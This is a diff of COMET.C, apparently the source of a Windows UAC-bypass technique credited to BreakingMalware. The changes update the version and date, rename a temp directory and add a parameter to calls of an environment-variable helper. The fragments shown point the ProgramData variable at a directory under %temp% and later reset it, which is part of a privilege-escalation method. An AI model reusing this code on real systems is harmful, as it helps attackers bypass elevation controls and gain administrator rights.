@@ -4,9 +4,9 @@
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.72
+*  VERSION:     2.84
 *
-*  DATE:        25 May 2017
+*  DATE:        22 Nov 2017
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -63,7 +63,7 @@ BOOL ucmCometMethod(
 
         RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
         _strcpy(szCombinedPath, g_ctx.szTempDirectory);
-        _strcat(szCombinedPath, L"huy32");
+        _strcat(szCombinedPath, SOMEOTHERNAME);
         if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
             if (GetLastError() != ERROR_ALREADY_EXISTS)
                 break;
@@ -76,7 +76,7 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        if (!supSetEnvVariable(FALSE, T_PROGRAMDATA, szCombinedPath))
+        if (!supSetEnvVariable(FALSE, NULL, T_PROGRAMDATA, szCombinedPath))
             break;
 
         _strcat(szCombinedPath, TEXT("\\Microsoft"));
@@ -154,6 +154,6 @@ BOOL ucmCometMethod(
     }
 #endif
 
-    supSetEnvVariable(TRUE, T_PROGRAMDATA, NULL);
+    supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
     return bResult;
 }
